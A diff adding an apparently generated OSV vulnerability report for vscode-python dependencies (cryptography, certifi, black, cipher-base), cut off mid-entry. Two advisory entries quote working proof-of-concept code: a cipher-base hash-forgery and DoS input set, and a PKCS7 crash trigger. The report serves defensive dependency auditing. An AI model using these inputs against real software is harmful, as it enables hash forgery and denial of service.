@@ -1,0 +1,2084 @@
+{
+  "analyzedAt": "2025-12-17T20:07:21.504Z",
+  "source": "Microsoft__vscode-python.osv.json",
+  "summary": {
+    "totalVulnerabilities": 28,
+    "uniqueVulnerabilities": 28,
+    "affectedPackages": 10,
+    "stalePackages": 28,
+    "stalePackagesOldFix": 21,
+    "severityBreakdown": {
+      "CRITICAL": 0,
+      "HIGH": 0,
+      "MEDIUM": 2,
+      "LOW": 26
+    },
+    "recentVulnerabilities": 2,
+    "hasFixAvailable": 28
+  },
+  "vulnerabilities": [
+    {
+      "id": "GHSA-39hc-v87j-747x",
+      "severity": "MEDIUM",
+      "severityScore": 5,
+      "cvssScores": [],
+      "aliases": [],
+      "summary": "Vulnerable OpenSSL included in cryptography wheels",
+      "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 37.0.0-38.0.3 are vulnerable to a number of security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20221101.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",
+      "cwes": [],
+      "age": {
+        "age": "3 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-11-02T18:11:56Z",
+        "modifiedDate": "2024-12-03T06:08:44.549863Z",
+        "daysSincePublished": 1141
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "38.0.3",
+        "recommendation": "Upgrade to 38.0.3 or later",
+        "fixAvailableSince": "2024-12-03T06:08:44.549Z",
+        "daysSinceFix": 379,
+        "monthsSinceFix": 12,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-39hc-v87j-747x"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/commit/382e759bcded5773330eeed748c86b213ec618c5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/commit/cf2ada625d1188d6cd46396f301b98095da577f7"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pyca/cryptography"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-h4gh-qq45-vh27",
+      "severity": "MEDIUM",
+      "severityScore": 5,
+      "cvssScores": [],
+      "aliases": [],
+      "summary": "pyca/cryptography has a vulnerable OpenSSL included in cryptography wheels",
+      "details": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 37.0.0-43.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20240903.txt.\n\nIf you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.\n",
+      "cwes": [
+        {
+          "id": "CWE-1395",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-09-03T21:59:48Z",
+        "modifiedDate": "2024-12-05T05:38:47.579675Z",
+        "daysSincePublished": 469
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "43.0.1",
+        "recommendation": "Upgrade to 43.0.1 or later",
+        "fixAvailableSince": "2024-12-05T05:38:47.579Z",
+        "daysSinceFix": 377,
+        "monthsSinceFix": 12,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-h4gh-qq45-vh27"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pyca/cryptography"
+        },
+        {
+          "type": "WEB",
+          "url": "https://openssl-library.org/news/secadv/20240903.txt"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-fj7x-q9j7-g6q6",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-21503",
+        "PYSEC-2024-48"
+      ],
+      "summary": "Black vulnerable to Regular Expression Denial of Service (ReDoS)",
+      "details": "Versions of the package black before 24.3.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the lines_with_leading_tabs_expanded function in the strings.py file. An attacker could exploit this vulnerability by crafting a malicious input that causes a denial of service.\n\nExploiting this vulnerability is possible when running Black on untrusted input, or if you habitually put thousands of leading tab characters in your docstrings.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        },
+        {
+          "id": "CWE-75",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-03-19T06:30:52Z",
+        "modifiedDate": "2024-07-03T21:30:43.913247Z",
+        "daysSincePublished": 638
+      },
+      "affected": {
+        "package": "black",
+        "version": "22.3.0",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "22.3.0",
+        "fixedIn": "24.3.0",
+        "recommendation": "Upgrade to 24.3.0 or later",
+        "fixAvailableSince": "2024-07-03T21:30:43.913Z",
+        "daysSinceFix": 531,
+        "monthsSinceFix": 17,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21503"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/psf/black/commit/f00093672628d212b8965a8993cee8bedf5fe9b8"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/psf/black"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/psf/black/releases/tag/24.3.0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2024-48.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-PYTHON-BLACK-6256273"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2024-230",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-39689",
+        "GHSA-248v-346w-9cwc"
+      ],
+      "summary": "No summary available",
+      "details": "Certifi is a curated collection of Root Certificates for validating the trustworthiness of SSL certificates while verifying the identity of TLS hosts. Certifi starting in 2021.05.30 and prior to 2024.07.4 recognized root certificates from `GLOBALTRUST`. Certifi 2024.07.04 removes root certificates from `GLOBALTRUST` from the root store. These are in the process of being removed from Mozilla's trust store. `GLOBALTRUST`'s root certificates are being removed pursuant to an investigation which identified \"long-running and unresolved compliance issues.\"",
+      "cwes": [],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-07-05T19:15:10Z",
+        "modifiedDate": "2025-02-12T21:42:09.790076Z",
+        "daysSincePublished": 530
+      },
+      "affected": {
+        "package": "certifi",
+        "version": "2022.5.18.1",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2022.5.18.1",
+        "fixedIn": "bd8153872e9c6fc98f4023df9c2deaffea2fa463",
+        "recommendation": "Upgrade to bd8153872e9c6fc98f4023df9c2deaffea2fa463 or later",
+        "fixAvailableSince": "2025-02-12T21:42:09.790Z",
+        "daysSinceFix": 307,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-248v-346w-9cwc"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://security.netapp.com/advisory/ntap-20241206-0001/"
+        },
+        {
+          "type": "ARTICLE",
+          "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/certifi/python-certifi/commit/bd8153872e9c6fc98f4023df9c2deaffea2fa463"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-43fp-rhv2-5gv8",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:H/A:N",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-23491",
+        "PYSEC-2022-42986"
+      ],
+      "summary": "Certifi removing TrustCor root certificate",
+      "details": "Certifi 2022.12.07 removes root certificates from \"TrustCor\" from the root store. These are in the process of being removed from Mozilla's trust store.\n\nTrustCor's root certificates are being removed pursuant to an investigation prompted by media reporting that TrustCor's ownership also operated a business that produced spyware. Conclusions of Mozilla's investigation can be found [here](https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/oxX69KFvsm4/m/yLohoVqtCgAJ).",
+      "cwes": [
+        {
+          "id": "CWE-345",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "3 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-12-07T23:05:18Z",
+        "modifiedDate": "2025-02-12T18:53:14.421067Z",
+        "daysSincePublished": 1105
+      },
+      "affected": {
+        "package": "certifi",
+        "version": "2022.5.18.1",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2022.5.18.1",
+        "fixedIn": "2022.12.07",
+        "recommendation": "Upgrade to 2022.12.07 or later",
+        "fixAvailableSince": "2025-02-12T18:53:14.421Z",
+        "daysSinceFix": 308,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-43fp-rhv2-5gv8"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23491"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/certifi/python-certifi/commit/9e9e840925d7b8e76c76fdac1fab7e6e88c1c3b8"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/certifi/python-certifi"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/certifi/PYSEC-2022-42986.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/oxX69KFvsm4/m/yLohoVqtCgAJ"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20230223-0010"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-xqr8-7jwr-rhp7",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-37920",
+        "PYSEC-2023-135"
+      ],
+      "summary": "Removal of e-Tugra root certificate",
+      "details": "Certifi 2023.07.22 removes root certificates from \"e-Tugra\" from the root store. These are in the process of being removed from Mozilla's trust store.\n\n e-Tugra's root certificates are being removed pursuant to an investigation prompted by reporting of security issues in their systems. Conclusions of Mozilla's investigation can be found [here](https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/C-HrP1SEq1A).",
+      "cwes": [
+        {
+          "id": "CWE-345",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-07-25T14:43:53Z",
+        "modifiedDate": "2025-02-12T21:36:30.322091Z",
+        "daysSincePublished": 876
+      },
+      "affected": {
+        "package": "certifi",
+        "version": "2022.5.18.1",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2022.5.18.1",
+        "fixedIn": "2023.7.22",
+        "recommendation": "Upgrade to 2023.7.22 or later",
+        "fixAvailableSince": "2025-02-12T21:36:30.322Z",
+        "daysSinceFix": 307,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-xqr8-7jwr-rhp7"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37920"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/certifi/python-certifi/commit/8fb96ed81f71e7097ed11bc4d9b19afd7ea5c909"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/certifi/python-certifi"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/certifi/PYSEC-2023-135.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/C-HrP1SEq1A"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5EX6NG7WUFNUKGFHLM35KHHU3GAKXRTG"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20240912-0002"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-cpq7-6gpm-g9rc",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:H/VA:H/SC:H/SI:H/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-9287"
+      ],
+      "summary": "cipher-base is missing type checks, leading to hash rewind and passing on crafted data",
+      "details": "### Summary\n\nThis affects e.g. `create-hash` (and `crypto-browserify`), so I'll describe the issue against that package\nAlso affects `create-hmac` and other packages\n\nNode.js `createHash` works only on strings or instances of Buffer, TypedArray, or DataView.\n\nMissing input type checks (in npm `create-hash` polyfill of Node.js `createHash`) can allow types other than a well-formed `Buffer` or `string`, resulting in invalid values, hanging and rewinding the hash state (including turning a tagged hash into an untagged hash), or other generally undefined behaviour.\n\n### Details\n\nSee PoC\n\n### PoC\n```js\nconst createHash = require('create-hash/browser.js')\nconst { randomBytes } = require('crypto')\n\nconst sha256 = (...messages) => {\n  const hash = createHash('sha256')\n  messages.forEach((m) => hash.update(m))\n  return hash.digest('hex')\n}\n\nconst validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whatever\n\nconst payload = forgeHash(Buffer.concat(validMessage), 'Hashed input means safe')\nconst receivedMessage = JSON.parse(payload) // e.g. over network, whatever\n\nconsole.log(sha256(...validMessage))\nconsole.log(sha256(...receivedMessage))\nconsole.log(receivedMessage[0])\n```\n\nOutput:\n```\n9ef59a6a745990b09bbf1d99abe43a4308b48ce365935e29eb4c9000984ee9a9\n9ef59a6a745990b09bbf1d99abe43a4308b48ce365935e29eb4c9000984ee9a9\nHashed input means safe\n```\n\nThis works with:\n```js\nconst forgeHash = (valid, wanted) => JSON.stringify([wanted, { length: -wanted.length }, { ...valid, length: valid.length }])\n```\n\nBut there are other types of input which lead to unchecked results\n\n### Impact\n\n1. Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration, like [GHSA-vjh7-7g9h-fjfh](https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh))\n6. Also, other typed arrays results are invalid, e.g. returned hash of `new Uint16Array(5)` is the same as `new Uint8Array(5)`, not `new Uint16Array(10)` as it should have been (and is in Node.js `crypto`) -- same for arrays with values non-zero, their hashes are just truncated to `%256` instead of converted to correct bytelength",
+      "cwes": [
+        {
+          "id": "CWE-20",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Recent (< 6 months)",
+        "isRecent": true,
+        "publishedDate": "2025-08-21T14:47:35Z",
+        "modifiedDate": "2025-11-03T21:34:22Z",
+        "daysSincePublished": 118
+      },
+      "affected": {
+        "package": "cipher-base",
+        "version": "1.0.4",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.0.4",
+        "fixedIn": "1.0.5",
+        "recommendation": "Upgrade to 1.0.5 or later",
+        "fixAvailableSince": "2025-11-03T21:34:22.000Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/browserify/cipher-base/security/advisories/GHSA-cpq7-6gpm-g9rc"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-9287"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/browserify/cipher-base/pull/23"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/browserify/cipher-base/commit/8fd136432ca298a664f5637629cf2b42a6c7f294"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/browserify/cipher-base"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2025/09/msg00005.html"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2023-254",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-49083",
+        "GHSA-jfhm-5ghh-2f97"
+      ],
+      "summary": "No summary available",
+      "details": "cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. Calling `load_pem_pkcs7_certificates` or `load_der_pkcs7_certificates` could lead to a NULL-pointer dereference and segfault. Exploitation of this vulnerability poses a serious risk of Denial of Service (DoS) for any application attempting to deserialize a PKCS7 blob/certificate. The consequences extend to potential disruptions in system availability and stability. This vulnerability has been patched in version 41.0.6.",
+      "cwes": [],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-11-29T19:15:00Z",
+        "modifiedDate": "2024-02-17T07:41:40.326359Z",
+        "daysSincePublished": 749
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "f09c261ca10a31fe41b1262306db7f8f1da0e48a",
+        "recommendation": "Upgrade to f09c261ca10a31fe41b1262306db7f8f1da0e48a or later",
+        "fixAvailableSince": "2024-02-17T07:41:40.326Z",
+        "daysSinceFix": 669,
+        "monthsSinceFix": 22,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-jfhm-5ghh-2f97"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/pyca/cryptography/pull/9926"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/pyca/cryptography/commit/f09c261ca10a31fe41b1262306db7f8f1da0e48a"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QMNTYMUGFJSDBYBU22FUYBHFRZODRKXV/"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-3ww4-gg4f-jr7f",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CGA-45f3-3fmq-7h5w",
+        "CVE-2023-50782"
+      ],
+      "summary": "Python Cryptography package vulnerable to Bleichenbacher timing oracle attack",
+      "details": "A flaw was found in the python-cryptography package. This issue may allow a remote attacker to decrypt captured messages in TLS servers that use RSA key exchanges, which may lead to exposure of confidential or sensitive data.",
+      "cwes": [
+        {
+          "id": "CWE-203",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-208",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-02-05T21:30:31Z",
+        "modifiedDate": "2024-10-22T05:29:04.269269Z",
+        "daysSincePublished": 680
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "42.0.0",
+        "recommendation": "Upgrade to 42.0.0 or later",
+        "fixAvailableSince": "2024-10-22T05:29:04.269Z",
+        "daysSinceFix": 421,
+        "monthsSinceFix": 14,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-50782"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/issues/9785"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/security/cve/CVE-2023-50782"
+        },
+        {
+          "type": "WEB",
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2254432"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pyca/cryptography"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-9v9h-cgj8-h64p",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CGA-v739-9xhw-5vmf",
+        "CVE-2024-0727"
+      ],
+      "summary": "Null pointer dereference in PKCS12 parsing",
+      "details": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack\n\nImpact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.\n\nA file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.\n\nOpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().\n\nWe have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
+      "cwes": [
+        {
+          "id": "CWE-476",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-01-26T09:30:23Z",
+        "modifiedDate": "2025-11-04T00:59:48.027289Z",
+        "daysSincePublished": 691
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "42.0.2",
+        "recommendation": "Upgrade to 42.0.2 or later",
+        "fixAvailableSince": "2025-11-04T00:59:48.027Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-0727"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/github/advisory-database/pull/3472"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/openssl/openssl/pull/23362"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/alexcrichton/openssl-src-rs/commit/add20f73b6b42be7451af2e1044d4e0e778992b2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/openssl/openssl/commit/09df4395b5071217b76dc7d3d2e630eb8c5a79c2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/openssl/openssl/commit/775acfdbd0c6af9ac855f34969cdab0c0c90844a"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/openssl/openssl/commit/d135eeab8a5dbf72b3da5240bab9ddb7678dbd2c"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/commit/3519591d255d4506fbcd0d04037d45271903c64d"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.openssl.org/openssl/extended-releases/commit/03b3941d60c4bce58fab69a0c22377ab439bc0e8"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.openssl.org/openssl/extended-releases/commit/aebaa5883e31122b404e450732dc833dc9dee539"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/10/msg00033.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/11/msg00000.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20240208-0006"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.openssl.org/news/secadv/20240125.txt"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.openwall.com/lists/oss-security/2024/03/11/1"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-jfhm-5ghh-2f97",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-49083",
+        "PYSEC-2023-254"
+      ],
+      "summary": "cryptography vulnerable to NULL-dereference when loading PKCS7 certificates",
+      "details": "### Summary\n\nCalling `load_pem_pkcs7_certificates` or `load_der_pkcs7_certificates` could lead to a NULL-pointer dereference and segfault.\n\n### PoC\nHere is a Python code that triggers the issue:\n```python\nfrom cryptography.hazmat.primitives.serialization.pkcs7 import load_der_pkcs7_certificates, load_pem_pkcs7_certificates\n\npem_p7 = b\"\"\"\n-----BEGIN PKCS7-----\nMAsGCSqGSIb3DQEHAg==\n-----END PKCS7-----\n\"\"\"\n\nder_p7 = b\"\\x30\\x0B\\x06\\x09\\x2A\\x86\\x48\\x86\\xF7\\x0D\\x01\\x07\\x02\"\n\nload_pem_pkcs7_certificates(pem_p7)\nload_der_pkcs7_certificates(der_p7)\n```\n\n### Impact\nExploitation of this vulnerability poses a serious risk of Denial of Service (DoS) for any application attempting to deserialize a PKCS7 blob/certificate. The consequences extend to potential disruptions in system availability and stability.",
+      "cwes": [
+        {
+          "id": "CWE-476",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-11-28T20:46:46Z",
+        "modifiedDate": "2025-11-04T17:17:17.475538Z",
+        "daysSincePublished": 749
+      },
+      "affected": {
+        "package": "cryptography",
+        "version": "37.0.2",
+        "ecosystem": "PyPI"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "37.0.2",
+        "fixedIn": "41.0.6",
+        "recommendation": "Upgrade to 41.0.6 or later",
+        "fixAvailableSince": "2025-11-04T17:17:17.475Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/security/advisories/GHSA-jfhm-5ghh-2f97"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49083"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/pull/9926"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pyca/cryptography/commit/f09c261ca10a31fe41b1262306db7f8f1da0e48a"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pyca/cryptography"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/cryptography/PYSEC-2023-254.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/10/msg00012.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QMNTYMUGFJSDBYBU22FUYBHFRZODRKXV"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.openwall.com/lists/oss-security/2023/11/29/2"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-w7pp-m8wf-vj6r",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
